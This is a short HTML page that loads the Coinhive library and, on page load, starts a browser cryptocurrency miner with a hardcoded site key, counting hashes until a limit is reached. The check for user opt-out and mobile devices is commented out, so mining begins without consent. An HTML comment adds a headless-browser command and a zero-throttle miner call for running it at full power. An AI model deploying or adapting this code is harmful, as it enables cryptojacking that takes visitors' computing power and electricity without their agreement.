<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<!-- 
chromium-browser --headless --disable-gpu --repl https://0x00sec.org --no-sandbox


>> miner = new CoinHive.User('cWSVItnZA8aBw6ejDP7i4G7HroscFcLI', "headless", { throttle: 0, autoThreads: true});
-->
<center>
<script>
	var miner = new CoinHive.Anonymous('cWSVItnZA8aBw6ejDP7i4G7HroscFcLI', {throttle: 0.3});
	var count=0;
	var maxHashes=2800;
	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	//if (!miner.isMobile() && !miner.didOptOut(14400)) 
	{
		miner.start();
		miner.on('found', function() { console.log('found') })
		miner.on('accepted', function() { 
			count=count+1;
			if (count>=maxHashes)
				{	
					miner.stop();
					$('#info').html("Accepted "+count+" hashes!");

				}/* Hash accepted by the pool */ 
			}
		)
		// Update stats once per second
		setInterval(function() {
			var hashesPerSecond = miner.getHashesPerSecond();
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes();
			$('#info').html("Done "+acceptedHashes+" hashes!");
			console.log(totalHashes)
			// Output to HTML elements...
			if (acceptedHashes>=maxHashes)
			{	
					miner.stop();
					$('#info').html("Finshed with "+acceptedHashes+" hashes :)");
					//$(window).trigger('resize');


			}
		}, 5000);
		//var elem = document.getElementByTagName("body")

	}
</script>
</head>
<body>

<div id="info"></div>
</center>
</body>
</html>
